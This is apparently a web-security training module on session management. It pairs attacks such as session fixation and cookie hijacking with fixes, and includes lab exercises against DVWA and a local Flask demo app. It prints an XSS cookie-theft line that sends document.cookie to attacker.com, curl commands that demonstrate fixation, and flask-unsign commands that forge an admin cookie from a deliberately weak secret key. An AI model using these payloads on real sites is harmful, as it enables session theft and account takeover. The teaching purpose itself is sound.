## Main Content — Part 1: Session Management Fundamentals

### 1. The Session Lifecycle

```
1. User authenticates (correct username + password)
2. Server creates session: session_id = CSPRNG(32 bytes)
3. Server stores session data server-side: {session_id: {user_id:123, role:"user"}}
4. Server sends session_id to client via cookie
5. Client sends cookie on every subsequent request
6. Server looks up session_id → gets user context → applies access control
7. Session expires: timeout, logout, or explicit invalidation
```

**The session cookie is the credential.** After authentication, the
password is no longer needed. Whoever holds the session cookie is the user.

---

### 2. Session Token Requirements

For a session token to be secure:

| Property | Minimum | Why |
|---|---|---|
| **Entropy** | 128 bits | Brute force resistance |
| **Source** | CSPRNG | Unpredictability |
| **Uniqueness** | Per user, per session | Prevent sharing |
| **Storage** | Server-side (not in cookie body) | Prevents tampering |
| **Transmission** | HTTPS only | Prevents sniffing |
| **Cookie flags** | `HttpOnly; Secure; SameSite=Strict` | Prevents JS access, MITM, CSRF |
| **Invalidation** | On logout + timeout | Prevents stale sessions |

### 3. Session Fixation

**The attack:** The attacker sets the victim's session ID before authentication.
After the victim logs in, the server associates that session ID with the
victim's account. The attacker, who knows the session ID, is now logged in.

**How it works:**

```
1. Attacker visits the site: gets session_id = ATTACKER_KNOWN_VALUE
2. Attacker tricks victim into using that session_id:
   - URL param: https://target.com/login?PHPSESSID=ATTACKER_KNOWN_VALUE
   - Some apps set the session cookie from the URL parameter (old PHP apps)
3. Victim logs in with ATTACKER_KNOWN_VALUE as their session_id
4. Server upgrades the session to authenticated state without changing the ID
5. Attacker uses ATTACKER_KNOWN_VALUE to access the victim's session
```

**Fix: Regenerate the session ID immediately after login:**

```python
# Flask
@app.route('/login', methods=['POST'])
def login():
    # ... authenticate ...
    # CRITICAL: regenerate session ID after successful auth
    flask.session.clear()
    flask.session['user_id'] = user.id
    # Flask handles session regeneration automatically via secret_key
    # But for explicit control:
    # session.modified = True
    # session.permanent = True

# Express.js
app.post('/login', async (req, res) => {
    const user = await authenticate(req.body);
    if (user) {
        req.session.regenerate((err) => {      // ← This is the critical call
            req.session.userId = user.id;
            res.redirect('/dashboard');
        });
    }
});
```

### 4. Session Hijacking Methods

**Method 1 — XSS:** If the site has XSS and the session cookie is not
`HttpOnly`, steal the cookie:

```javascript
fetch('https://attacker.com/steal?c=' + document.cookie);
```

Fix: `HttpOnly` flag on the session cookie.

**Method 2 — Network Sniffing:** If the session cookie is sent over HTTP
(no `Secure` flag), a network attacker on the same segment captures it.

Fix: `Secure` flag + HSTS.

**Method 3 — Sub-domain Attack:** If `Domain=.example.com` is set, any
subdomain (`evil.example.com`) can read the cookie.

Fix: Set `Domain=app.example.com` (specific subdomain only).

**Method 4 — Cross-site Request with CSRF:** The attacker cannot read
the cookie (XSS required for that) but can force the browser to send it.

Fix: `SameSite=Strict` prevents the cookie from being sent on cross-origin
requests. CSRF token for POST requests.

### Lab Task 1 — Analyse Session Token Entropy

1. Log into DVWA with `admin` / `password`.
2. Capture the `PHPSESSID` cookie in Burp.
3. Log out and log back in. Capture the new session ID.
4. Repeat 10 times. Collect 10 session IDs.

**Analysis questions:**
- What is the length of each session ID in bytes?
- Are they consistent in length? Random-looking?
- Check: `echo -n "PHPSESSID_VALUE" | wc -c` → how many bits of apparent
  entropy?
- Is there any pattern (sequential, timestamp-based)?

PHP's `session_id()` default uses `CSPRNG` in modern PHP — it should be
32 hex chars = 128 bits. If you see shorter or patterned IDs, that's a find.

### Lab Task 2 — Session Fixation Demo (DVWA)

DVWA (PHP) accepts `PHPSESSID` from URL params in some configurations:

```bash
# Step 1: Set a known session ID via URL:
curl "http://localhost/login.php?PHPSESSID=FIXED_ATTACKER_ID" -I

# Step 2: POST login with that session ID:
curl -X POST "http://localhost/login.php" \
    -b "PHPSESSID=FIXED_ATTACKER_ID" \
    -d "username=admin&password=password&Login=Login" -L

# Step 3: Try accessing the site with the fixed session ID:
curl "http://localhost/index.php" \
    -b "PHPSESSID=FIXED_ATTACKER_ID"

# If you get a 200 with user content → session fixation confirmed
```

### Lab Task 3 — Decode and Tamper a Cookie

Some applications encode user data directly in the cookie value
(insecure — server should store state, not client):

```bash
# Create a test Flask app:
cat > /tmp/cookie_demo.py << 'EOF'
from flask import Flask, session, request, redirect
app = Flask(__name__)
app.secret_key = "weak_secret"

@app.route('/login')
def login():
    session['user'] = 'alice'
    session['role'] = 'user'
    return redirect('/dashboard')

@app.route('/dashboard')
def dashboard():
    return f"Logged in as {session.get('user')}, role={session.get('role')}"

if __name__ == '__main__':
    app.run(port=5000)
EOF
python3 /tmp/cookie_demo.py &
```

1. Visit `http://localhost:5000/login` and capture the session cookie.
2. Flask's default session is a signed Base64 blob. Decode the payload:

```bash
# Cookie format: BASE64_PAYLOAD.TIMESTAMP.HMAC
# Decode the payload part:
PAYLOAD=$(echo "YOUR_COOKIE" | cut -d'.' -f1 | base64 -d 2>/dev/null | zcat 2>/dev/null)
echo $PAYLOAD
# Should show: {"user":"alice","role":"user"}
```

3. Now try to tamper: can you change `role` to `admin`?
   (You shouldn't be able to without the secret key — this is the correct
   behaviour of signed cookies. But if the secret key is `weak_secret`
   and you know it, you can forge signatures. Try `flask-unsign`.)

```bash
# Install flask-unsign:
pip install flask-unsign

# Decode and forge:
flask-unsign --decode --cookie "YOUR_COOKIE_VALUE"
flask-unsign --sign --cookie "{'user':'alice','role':'admin'}" \
    --secret 'weak_secret'
```

## Key Takeaways

1. **The session cookie IS the authentication credential.** Stealing it
   equals owning the account. Protect it with `HttpOnly`, `Secure`,
   `SameSite=Strict`.
2. **Always regenerate the session ID after login.** Session fixation is
   eliminated by one call: `req.session.regenerate()`.
3. **Server-side session storage is the correct architecture.** The cookie
   holds only an opaque ID. The server stores the session data. Putting
   user roles or permissions in a client-controlled cookie (even signed)
   is risky.
4. **Weak session tokens enable brute-force session attacks.** A 32-byte
   random hex token from CSPRNG has 128 bits of entropy — infeasible to
   guess. A sequential integer or timestamp-based token is trivial.
5. **Idle session timeout limits the damage window.** If a session token
   is stolen but the session expires after 15 minutes of inactivity, the
   attacker has a limited window. Absolute maximum session lifetime (e.g.
   24 hours regardless of activity) is also important.
